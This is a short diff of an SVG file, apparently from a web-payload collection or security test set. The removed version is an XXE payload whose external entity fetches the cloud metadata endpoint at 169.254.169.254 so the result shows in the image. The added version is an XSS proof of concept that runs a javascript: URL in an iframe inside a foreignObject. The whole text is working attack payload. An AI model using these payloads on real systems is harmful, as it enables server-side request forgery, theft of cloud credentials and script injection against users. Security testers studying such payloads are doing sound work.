@@ -1,7 +1,13 @@
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ 
-<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" > 
-]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
- <text x="5" y="30" font-size="5">&xxe;</text>
+<!DOCTYPE html>
+
+
+ <svg width="600" height="800" xmlns="http://www.w3.org/2000/svg">
+  <g>
+      <g id="0ea5f198be28b719853b18c739002923" name="text_free">
+       <rect width="300" height="100" style="fill:rgb(0,0,0);stroke-width:1;stroke:rgb(0,0,0)"/>
+     </g>
+     <foreignObject height="50" width="100" y="100">
+      <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('xssed by shb')" height="100" width="100"/>
+     </foreignObject>
+  </g>
 </svg>
